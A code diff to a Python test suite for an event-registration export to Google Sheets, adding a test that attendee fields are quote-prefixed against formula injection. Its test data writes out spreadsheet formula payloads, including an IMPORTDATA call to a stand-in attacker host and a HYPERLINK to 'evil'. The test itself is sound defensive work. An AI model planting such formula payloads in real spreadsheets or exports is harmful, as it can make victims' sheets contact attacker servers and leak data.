@@ -214,7 +214,10 @@ class RowsHelperTest(TestCase):
         row = build_row(registration, event, ["Q1"], 5)
 
         self.assertEqual(row[0], "5")
-        self.assertIn("+15551234567", row)
+        # The "+"-leading phone is formula-neutralized (quote-prefixed) like the
+        # member-sync path; Sheets renders it as the text "+1555…" with no visible
+        # apostrophe.
+        self.assertIn("'+15551234567", row)
         self.assertIn("row2@example.com", row)
         self.assertEqual(row[-1], "Yes")
 
@@ -228,6 +231,34 @@ class RowsHelperTest(TestCase):
 
         self.assertEqual(row[-1], "")
         self.assertNotIn("+15551234567", row)
+
+    def test_build_row_neutralizes_formula_injection(self):
+        # Attendee-supplied cells are written with USER_ENTERED, so a value that
+        # starts with a formula trigger (=,+,-,@) must be prefixed with a quote
+        # to stop Google Sheets from evaluating it (formula/CSV injection).
+        event = make_event(collect_phone=True, allow_secondary_email=True)
+        ticket = make_ticket(event, name="GA")
+        member = make_member(email="evil-row@example.com")
+        registration = make_registration(
+            member,
+            event,
+            ticket,
+            attendee_first_name='=IMPORTDATA("https://attacker.example/x")',
+            attendee_last_name="@SUM(A1:A9)",
+            attendee_phone="+15551234567",
+            attendee_email="evil-row@example.com",
+            attendee_secondary_email="row2@example.com",
+            question_answers=[{"question_text": "Q1", "answer": '=HYPERLINK("https://evil","x")'}],
+        )
+
+        row = build_row(registration, event, ["Q1"], 5)
+
+        self.assertEqual(row[1], '\'=IMPORTDATA("https://attacker.example/x")')
+        self.assertEqual(row[2], "'@SUM(A1:A9)")
+        self.assertEqual(row[-1], '\'=HYPERLINK("https://evil","x")')
+        # No cell handed to Sheets still begins with a raw formula trigger.
+        for cell in row:
+            self.assertFalse(cell.startswith(("=", "+", "-", "@")), cell)
 
 
 class LogsHelperTest(TestCase):
